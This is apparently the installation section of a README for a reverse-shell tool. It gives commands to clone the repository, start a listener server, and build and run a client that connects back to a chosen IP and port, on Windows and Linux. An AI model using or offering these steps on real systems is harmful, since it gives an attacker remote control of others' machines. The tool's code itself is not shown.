### INSTALLATION
```bash
    git clone https://github.com/0x18F/THECODEX_REVERSESHELL
 ```
```bash
    cd THECODEX_REVERSESHELL
```
#### Windows
```bash
    python server.py
```
On new terminal:
```bash
    python builder.py -i IP -p PORT -o client.py
```
```bash
    python client.py
```
    
#### Linux
```bash
    python3 server.py
```
On new terminal:
```bash
    python3 builder.py -i IP -p PORT -o client.py
```
```bash
    python3 client.py
```
